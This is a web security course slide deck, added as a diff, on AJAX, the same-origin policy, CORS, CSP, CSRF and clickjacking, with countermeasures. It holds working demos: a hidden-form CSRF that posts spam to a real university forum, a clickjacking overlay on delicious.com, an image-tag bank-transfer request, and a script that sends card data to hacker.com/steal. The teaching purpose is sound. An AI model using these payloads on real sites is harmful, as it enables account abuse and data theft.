@@ -1,0 +1,675 @@
+---
+categories: Classes JavaScript AJAX Security
+toc: no
+...
+
+view this as a [slideshow](?export&format=Slidy)
+
+
+# AJAX Security issues
+
+Is [AJAX]() vulnerable to [XSS]() or other types of injections?
+
+**Short answer:** no more nor less than Web 1.0 pages, `<form>`'s,
+  `<iframe>`'s, `<img>`'s, etc.
+  
+**Long answer:**
+
+> - If you can inject [JavaScript](), then you can inject  [XMLHttpRequest]()'s, and *vice versa*;
+> - [AJAX]() can send **GET requests**: well, **`<img>` can too!**;
+> - [AJAX]() can send **POST requests**: well, you can **create a `<form>` in a hidden `<iframe>` and submit it**;
+> - [AJAX]() can **read the response to GET and POST** requests: then, in principle, **`<iframe>`'s can too** (more details later).
+
+In practice [AJAX]() is **no more dangerous** than other technologies,
+but it **widens the attack surface**.
+
+
+# Same Origin Policy (originated in Netscape 2.0)
+
+Two documents **not originating from the same domain** cannot access
+each other's contents:
+
+> - No access to [DOM](), [Cookies](Cookie), [URL]()'s, ...
+> - No access **between windows** and **between frames**.
+
+However
+
+> - Scripts included using **`<script>`** have full access (thus SOP cannot block [injected](XSS) [JavaScript]());
+> - Other tags that violate the SOP (for a reason): `<img>`, `<link>`, `<embed>`, `<object>`, `<iframe>`, `<bgsound>`, ...
+> - **`window.name`** violates the SOP (ok, it is not much used anyway);
+> - **`window.postMessage`**, introduced in [HTML5](HTML), promises a new wave of security holes!
+
+Read <http://code.google.com/p/browsersec/wiki/Part2>.
+
+
+
+# Same Origin Policy: Example
+
+<form id="go" action="" style="width:80%; margin: 0 auto 1ex auto">
+<input id="page" type="text" style="width:90%" />
+<input type="submit" value="Go!" style="width:8%" />
+</form>
+
+<iframe id="sop" style="width:80%;height:60%;margin:auto;display:block">
+</iframe>
+
+<div style="width:80%; margin: 1ex auto 0 auto; text-align:center">
+<input id="child" type="button" value="Modify child window" style="margin: 0 1ex"/>
+<input id="parent" type="button" value="Modify parent window" style="margin: 0 1ex"/>
+</div>
+
+<style>
+.highlight { background-color: yellow }
+</style>
+
+<script src="js/jquery.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+$(function() {
+    var page = document.location.href.replace(/#.*$/, '#same-origin-policy-example');
+    $('#page').val(page);
+    $('#go').submit(function() {
+        try {
+            $('#sop').contents()[0].location.replace($('#page').val());
+        } catch (err) {
+            alert(err);
+        }
+        return false;
+    });
+    $('#child').click(function() {
+        try {
+            $('#sop').contents().find('body').toggleClass('highlight');
+        } catch (err) {
+            alert(err);
+        }
+    });
+    $('#parent').click(function() {
+        $(top.document.body).toggleClass('highlight');
+    });
+})
+</script>
+
+
+# Restrictions on AJAX
+
+> - A script can send an `XMLHttpRequest` **to any address**;
+> - it can read back responses **only coming from the same domain**.
+
+<form id="xhr-go" action="" style="width:80%; margin: 0 auto 1ex auto">
+<input id="xhr-page" type="text" style="width:90%" />
+<input type="submit" value="Go!" style="width:8%" />
+</form>
+
+<textarea id="xhr" style="width:80%;height:40%;margin:auto;display:block">
+</textarea>
+
+<script type="text/javascript">
+$(function() {
+    var page = document.location.protocol + '//' + document.location.host + document.location.pathname;
+    $('#xhr-page').val(page);
+    $('#xhr-go').submit(function() {
+        $('#xhr-go').add('#xhr-go > *').prop('disabled', true);
+        $.ajax({
+            url: $('#xhr-page').val(),
+            dataType: 'text',
+            error: function(xhr, text, e) {
+                alert(text + ' ' + e);
+            },
+            success: function(data) {
+                $('#xhr').val(data);
+            },
+            complete: function() {
+                $('#xhr-go').add('#xhr-go > *').prop('disabled', false);
+            }
+        });
+        return false;
+    });
+})
+</script>
+
+
+**Problem:** how to query third-party APIs (Google maps, Yahoo finance, etc.)?
+
+
+# Cross-domain AJAX
+
+**Problem:** how to query third-party APIs?
+
+Classic solution: **Proxies**
+
+Write a [PHP]() program that makes the connection to the web service.
+
+
+<svg width="700" height="300" style="margin:auto;display:block">
+  <defs
+     id="defs4">
+    <marker
+       inkscape:stockid="Arrow1Lend"
+       orient="auto"
+       refY="0"
+       refX="0"
+       id="Arrow1Lend"
+       style="overflow:visible">
+      <path
+         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
+         style="fill-rule:evenodd;stroke:#000;"
+         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
+    </marker>
+    <marker
+       inkscape:stockid="redarrow"
+       orient="auto"
+       refY="0"
+       refX="0"
+       id="redarrow"
+       style="overflow:visible">
+      <path
+         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
+         style="fill-rule:evenodd;stroke:#f00;fill:#f00"
+         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
+    </marker>
+        <marker
+       inkscape:stockid="cross"
+       orient="auto"
+       refY="0.0"
+       refX="0.0"
+       id="cross"
+       style="overflow:visible">
+      <g>
+        <path
+           d="M 4.6254930,-5.0456926  -5.4129913,4.9543074"
+           style="fill:none;fill-rule:evenodd;stroke:#f00" />
+        <path
+           d="M -5.4129913,-5.0456926 4.6254930,4.9543074"
+           style="fill:none;fill-rule:evenodd;stroke:#f00" />
+      </g>
+    </marker>
+  </defs>
+  <g>
+    <text x="0" y="40" style="font-family:monospace">www.example.com</text>
+    <text x="0" y="220">AJAX Client</text>
+    <text x="350" y="40" style="font-family:monospace">query.yahooapis.com</text>
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 30,60 0,130" />
+    <image
+        xlink:href="/document.png"
+        x="10" y="90"
+        width="44" height="60" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 100,190 0,-130" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 120,60 0,130" />
+    <text x="90" y="140" style="font-weight:bold;stroke:#888;fill:#000">AJAX</text>
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 260,30 70,0" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 330,40 -70,0" />
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow1Lend)"
+       d="m 160,200 300,-140" />
+    <path
+       style="fill:none;stroke:#f00;stroke-dasharray:1, 1;stroke-dashoffset:0;marker-end:url(#redarrow);marker-mid:url(#cross)"
+       d="m 490,60 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 -36,17 " />
+  </g>
+</svg>
+
+
+# Cross-Origin Resource Sharing
+
+[CORS](): introduced in Firefox 3.5, almost standard:
+
+> 1. `XMLHttpRequest` requests a cross-domain GET connection;
+> 2. The browser adds an [HTTP]() header **`Origin`**;
+
+~~~
+GET /api/query.php?car=peugeot HTTP/1.1
+Host: api.webservice.com
+...
+Origin: www.example.com
+~~~
+
+> 3. The server responds with **`Acces-Control-Allow-Origin`**:
+
+~~~
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: *
+~~~
+
+~~~
+HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: www.example.com
+~~~
+
+> 4. The browser returns the response to the `XMLHttpRequest` object
+    only if the origin is allowed.
+
+-------
+
+POST requests are not **[safe](REST)** (their effects cannot be undone)!
+
+> 1. `XMLHttpRequest` requests a cross-domain **POST** connection;
+> 2. The browser changes the request to **OPTIONS**;
+
+~~~
+OPTIONS /api/query.php?car=peugeot HTTP/1.1
+Host: api.webservice.com
+Origin: www.example.com
+Access-Control-Request-Method: POST
+~~~
+
+> 3. The server responds with **`Acces-Control-Allow-Origin`**:
+
+~~~
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: www.example.com
+Access-Control-Allow-Methods: POST, GET, OPTIONS 
+~~~
+
+> 4. If the request is authorized, the browser sends the **POST**;
+
+~~~
+POST /api/query.php?car=peugeot HTTP/1.1
+Host: api.webservice.com
+Origin: www.example.com
+~~~
+
+> 5. The response is returned to the `XMLHttpRequest` object.
+
+
+
+# CORS and security 
+
+`www.hacker.com` **cannot connect** to `www.mybank.com` **as if she were the user**
+
+> - Coherent with the frame and window SOPs;
+
+`www.hacker.com` **can force** `www.mybank.com` **to retrieve content** from `www.hacker.com`
+
+> - Needs an [XSS]() flaw to start the attack;
+> - The same can be achieved with `<script>`, `<iframe>`, `<img>`, ...
+> - It could be used to circumvent filtering of `<script>` tags.
+
+<svg width="700" height="300" style="margin:auto;display:block">
+  <defs
+     id="defs4">
+    <marker
+       orient="auto"
+       refY="0"
+       refX="0"
+       id="Arrow2Lend"
+       style="overflow:visible">
+      <path
+         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
+         style="fill-rule:evenodd;stroke:#000;"
+         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
+    </marker>
+    <marker
+       orient="auto"
+       refY="0"
+       refX="0"
+       id="redarrow2"
+       style="overflow:visible">
+      <path
+         d="M 0,0 5,-5 -12.5,0 5,5 0,0 z"
+         style="fill-rule:evenodd;stroke:#f00;fill:#f00"
+         transform="matrix(-0.8,0,0,-0.8,-10,0)" />
+    </marker>
+        <marker
+       orient="auto"
+       refY="0.0"
+       refX="0.0"
+       id="cross2"
+       style="overflow:visible">
+      <g>
+        <path
+           d="M 4.6254930,-5.0456926  -5.4129913,4.9543074"
+           style="fill:none;fill-rule:evenodd;stroke:#f00" />
+        <path
+           d="M -5.4129913,-5.0456926 4.6254930,4.9543074"
+           style="fill:none;fill-rule:evenodd;stroke:#f00" />
+      </g>
+    </marker>
+  </defs>
+  <g>
+    <text x="0" y="40" style="font-family:monospace">www.mybank.com</text>
+    <text x="240" y="235">Client</text>
+    <text x="350" y="40" style="font-family:monospace">www.hacker.com</text>
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow2Lend)"
+       d="m 340,35 -100,0" />
+    <text x="260" y="45" style="font-weight:bold;stroke:#888;fill:#000">XSS</text>
+    <path
+       style="fill:none;stroke:#000;marker-end:url(#Arrow2Lend)"
+       d="m 100,54 180,126 180,-126" />
+    <path
+       style="fill:none;stroke:#f00;stroke-dasharray:1, 1;stroke-dashoffset:0;marker-end:url(#redarrow2);marker-mid:url(#cross2)"
+       d="m 480,60 -40,28 -40,28 -40,28 -40,28 -40,28 -40,-28 -40,-28 -40,-28 -40,-28 -40,-28 " />
+  </g>
+</svg>
+
+
+
+# Content Security Policy
+
+**Problem:** How to restrict more tightly the capabilities of an [XSS]()?
+
+**CSP:** restrict actions based on their source domain, at the [HTTP]() level.
+
+Still experimental, implemented by
+
+> - **`X-Content-Security-Policy:`** Firefox (and, partially, IE),
+> - **`X-WebKit-CSP:`** Chrome.
+
+**What can be restricted:**
+
+> - Inlined [JavaScript](), `eval`, [CSS](), XSLT transformations, Web Fonts;
+> - Sources for [HTML]() tags: `<script>`, `<object>`, `<embed>`, `<style>`, `<img>`, `<audio>`, `<video>`, `<iframe>`;
+> - Sources for [DOM]() APIs: `XMLHttpRequest`, WebSockets, Server-triggered events.
+
+See <http://www.w3.org/TR/CSP/#sotd>
+
+
+# CSP Example
+
+~~~
+HTTP/1.1 200 OK
+...
+X-Content-Security-Policy: default-src 'self';
+                           img-src *;
+                           object-src media.example.com
+                                      *.cdn.example.com;
+                           script-src https://js.example.com;
+                           connect-src https:
+~~~
+
+**`<img>` tags are always allowed**
+
+~~~ {.html}
+<img src="http://farm1.staticflickr.com/1/xxxxxxxxxx.jpg" />
+~~~
+
+**Plugins are only allowed from certain subdomains**
+
+~~~ {.html}
+<object data="http://media.example.com/video.swf"></object>
+~~~
+
+**`<script>` tags are only allowed from `https://js.example.com`**
+
+~~~ {.html}
+<script src="https://js.example.com/jquery.min.js"></script>
+~~~
+
+**Dynamic connections are only allowed over SSL**
+
+~~~ {.javascript}
+var xhr = new XMLHttpRequest()
+xhr.open("GET", "https://api.finance.com/cac40?c=total")
+~~~
+
+**Any other content is only allowed from the same page**
+
+
+
+# CSRF: legit attacks!
+
+[**Cross-Site Request Forgeries**](CRSF) are an intrinsic flaw of the Web
+
+## The actors
+
+A web **server** containing **confidential data**.
+
+A legitimate **authenticated user** having some **rights on the data**.
+
+A malicious **attacker** who:
+
+> - knows the web server API (e.g., the API is public),
+> - controls a third party site **unrelated to the victim server** (e.g. its own, or an [XSS]() injected site).
+
+## The effects
+
+The attacker gains access to the confidential data as if she were the legitimate user.
+
+
+# CRSF: How?
+
+**Prerequisites**
+
+> - The user is **logged on the server** (e.g. she has left the server without logging out);
+> - The user casually **visits the attacker's malicious page**.
+
+**What happens next ?**
+
+> - The **attacker's page** triggers a request to the server
+
+~~~ {.html}
+<html>
+...
+<h1>Recipe: Panini Reblochon Nutella</h1>
+<h2>Ingrédients:</h2>
+<ul>
+<li>Two slices of bread</li>
+...
+<img width="0" height="0"
+     src="http://server.com/transfer?to=attacker&amount=10k" />
+~~~
+
+> - The user's browser tries to fetch the image and triggers an
+    **authenticated money transfer**.
+
+
+# CRSF demo: e-campus 2
+
+> 1. Connect to <http://e-campus2.uvsq.fr/>,
+> 2. Go to [the forum section](http://e-campus2.uvsq.fr/Cours/Cours.lucadefe.2012-01-04.1946/cours_forum_view?selected_tab=forum&etudiant=None).
+> 3. Now, suppose you visit a random site (e.g. this site!!!), containing the following **`<iframe>`** (hidden with [**`display:none`**](javascript:hide_frame())):
+
+<iframe id="ecampus" style="width:80%;height:2em;margin:auto;display:block">
+</iframe>
+
+<script>
+$(function() {
+    $('#ecampus').contents().find('body').html('<form id="ecampus-form" method="POST" action="http://e-campus2.uvsq.fr/Cours/Cours.lucadefe.2012-01-04.1946/cours_forum_view"><input type="text" name="title" value="Cheap Viagra" /><input type="text" name="description" value="Cheap Viagra" /><input type="text" name="form.submitted" value="1" /><input type="text" name="form.button.CreerSujetDiscussion" value="" /><input type="submit"/></form>');
+});
+
+function csrf() {
+  $('#ecampus').contents().find('#ecampus-form').submit();
+}
+
+function hide_frame() {
+  $('#ecampus').toggle('slow');
+}
+</script>
+
+> 4. [If you click here](javascript:csrf()), the form is submitted and the [CSRF]() is run.
+> 5. Now refresh [the forum section](http://e-campus2.uvsq.fr/Cours/Cours.lucadefe.2012-01-04.1946/cours_forum_view?selected_tab=forum&etudiant=None) and see what's happened.
+
+
+**Note:** If the `<iframe>` had
+  [really been hidden](javascript:hide_frame()), you wouldn't have
+  noticed anything.
+
+**Note:** This could have be done even **without the user clicking!**.
+
+
+
+# AJAX and CSRF: intercepting data
+
+> - The previous attack **cannot be performed** with `XMLHttpRequest`.
+> - but [AJAX]() offers new expositions to [CSRF]()!
+
+Imagine an **authenticated API** returning JavaScript requests:
+
+~~~ {.javascript}
+HTTP/1.1 200 OK
+Content-Type: text/javascript
+...
+
+var data = new UserData(
+  "firstName", "Pinco"
+  "lastName", Pallino",
+  "creditCard", "XXXX XXXX XXXX XXXX",
+);
+~~~
+
+--------------
+
+
+## The legitimate application
+
+> 1. Includes a [JavaScript]() library provided by the server
+
+~~~ {.html}
+<script src="http://www.server.com/js/api.js"></script>
+~~~
+
+> 2. Makes the [AJAX]() request to the API
+
+~~~ {.javascript}
+xhr = new XMLHttpRequest();
+xhr.open("GET", "http://api.server.com/getUserData?user=1000");
+~~~
+
+> 3. `eval`'s the [JavaScript]() and treats the data.
+
+~~~ {.javascript}
+eval(xhr.response());
+var card_number = data[5];
+~~~
+
+
+--------------
+
+## The attacker
+
+> 1. Creates a page unrelated to the server;
+
+> 2. Includes the following [JavaScript]() (overwriting the `UserData` definition)
+
+~~~ {.javascript}
+function UserData() {
+    var img = new Image();
+    img.src = "http://hacker.com/steal?" 
+              + Array.join(",", arguments);
+}
+~~~
+
+> 3. Forces the client to make a request to the API
+
+~~~ {.javascript}
+    xhr = new XMLHttpRequest();
+    xhr.open("GET",
+             "http://api.server.com/getUserData?user=1000");
+~~~
+
+> 4. The browser sends the data to `http://hacker.com/steal`.
+
+
+# Real world CSRF examples
+
+**GMail 2007 mail redirection:** arbitrary mail filters could be set via [CSRF]()
+
+> - <http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/>
+> - <http://www.davidairey.com/google-gmail-security-hijack/>
+
+**GMail 2007 contact theft:** attacker could steal user's contacts
+
+> - Based on JSONP, similar to the [AJAX]() + [CSRF]() example above.
+> - <http://jeremiahgrossman.blogspot.fr/2007/01/gmail-xsrf-json-call-back-hackery.html>
+> - <http://jeremiahgrossman.blogspot.fr/2006/01/advanced-web-attack-techniques-using.html>
+
+
+# CSRF countermeasures
+
+**User:**
+
+> - Log out;
+> - Use multiple browsers.
+
+**Developer:**
+
+> - Prefer POST to GET for requests that trigger actions;
+> - Check the `Referrer` header;
+> - Ask for confirmation;
+> - Make sessions expire quickly;
+> - Use captchas;
+> - Add session-related information to [URL]s;
+> - Hide one-time random tokens (**nonces**) into forms.
+
+**Note:** no definitive protection has been found yet!
+
+
+
+# Clickjacking and Mash-up security
+
+Asking for confirmation **may not be enough**
+
+[Clickjacking](): tricks the user into clicking on the confirmation button
+
+> - Includes the confirmation form in an `<iframe>`;
+> - Uses [CSS]() to superpose the `<iframe>` to seemingly innocuous content;
+> - Tricks the user into trying to click on the innocuous content;
+> - The click goes to the confirmation `<iframe>`.
+
+**(Unique?) real world case:** Twitter 2009 "Don't click this" prank:
+  <http://dsandler.org/outgoing/dontclick_orig.html>
+
+
+
+# Clickjacking: Example
+
+Connect to <http://www.delicious.com/>, then reload this page and move the slider
+
+<script type="text/javascript" src="js/html5slider.js"></script>
+<input id="slider" type="range" min="0" max="1" step="0.01" value="0.1"
+style="width:80%; margin:auto; display:block;" />
+
+<script type="text/javascript">
+$(function() {
+    $('#delicious').css('opacity', '0.1');
+    $('#slider').change(function() {
+        $('#delicious').css('opacity', $('#slider').val());
+    });
+});
+</script>
+
+<div style="margin: 1em 3em">
+<iframe id="delicious" 
+src="http://www.delicious.com/post?url=http%3A%2F%2Fwww.cheap-viagra.com&target_stack_id="
+style="width:800px; height:500px; overflow: none; z-index: 1; position: absolute">
+</iframe>
+
+<div style="z-index: 0; height: 450px; border: solid thin black; position: relative">
+  
+## Welcome to `LonelyHearts.org`
+
+There's thousands of LonelyHearts on our site!
+
+Just waiting for you!
+
+**Hurry up! Register, it's free!**
+
+<input type="button" value="Register for free!" style="position: absolute; top: 406px; left: 620px"/>
+
+</div>
+</div>
+
+
+# Clickjacking countermeasures
+
+Experimental header
+
+~~~
+X-Frame-Options: SAMEORIGIN
+~~~
+
+> - Prevents browsers from including the page into cross-domain frames
+> - Twitter has been using it since 2009...
+
+Read more:
+[`http://www.openajax.org`](http://www.openajax.org/whitepapers/Ajax and Mashup Security.php#Mashups)
